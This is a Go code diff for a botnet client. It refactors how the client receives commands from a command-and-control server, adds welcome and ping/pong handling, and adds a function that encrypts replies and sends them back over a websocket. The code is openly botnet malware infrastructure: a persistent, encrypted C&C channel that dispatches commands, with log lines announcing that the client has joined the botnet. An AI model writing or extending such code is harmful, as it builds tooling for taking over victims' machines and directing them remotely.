@@ -41,8 +41,8 @@ func NewBot(masterAddr string) (*Bot, error) {
 	}, nil
 }
 
-// Start runs the initialized slave process
-func (b *Bot) Start() {
+// Run runs the initialized bot process
+func (b *Bot) Run() {
 	interrupt := make(chan os.Signal, 1)
 	signal.Notify(interrupt, os.Interrupt)
 	for {
@@ -68,18 +68,34 @@ func (b *Bot) Start() {
 			log.Printf("could not unmarshal message from c&c server: %s", err)
 			continue
 		}
-		handleCommand(cmd)
+		b.HandleCommandFromCC(&cmd)
 	}
 }
 
-// handleCommand handles a single command from the master node
-func handleCommand(c protocol.Command) {
+// HandleCommandFromCC handles a single command from the command and control server
+func (b *Bot) HandleCommandFromCC(c *protocol.Command) error {
 	switch c.Type {
 	case protocol.CommandTypeWelcome:
-		log.Printf("[cmd&ctrl] WELCOME!!! joined botnet at unix time: %d", time.Now().UnixNano())
-		return
+		log.Printf("[cmd&ctrl] WELCOME!!! joined botnet at unix time: %d", time.Now().Unix())
+		return nil
+	case protocol.CommandTypePing:
+		log.Printf("[cmd&ctrl] PING!!! pinged by master at %d. full command: %v", time.Now().Unix(), c)
+		return b.SendMessageToCC(&protocol.Message{Type: protocol.MessageTypePong})
 	default:
-		log.Printf("received unknown event type at %d, full command: %v", time.Now().UnixNano(), c)
-		return
+		log.Printf("received unknown event type at %d. full command: %v", time.Now().Unix(), c)
+		return nil
 	}
+}
+
+// SendMessageToCC encrypts and sends a message to the CC Server
+func (b *Bot) SendMessageToCC(msg *protocol.Message) error {
+	msgJSON, err := json.Marshal(msg)
+	if err != nil {
+		return fmt.Errorf("could not marshal message: %s", err)
+	}
+	msgEncr, err := encryption.EncryptMessage(msgJSON, b.msgEncryptKey)
+	if err != nil {
+		return fmt.Errorf("could not encrypt message: %s", err)
+	}
+	return b.ccConnection.WriteMessage(protocol.WebsocketMessageFormatBinary, msgEncr)
 }
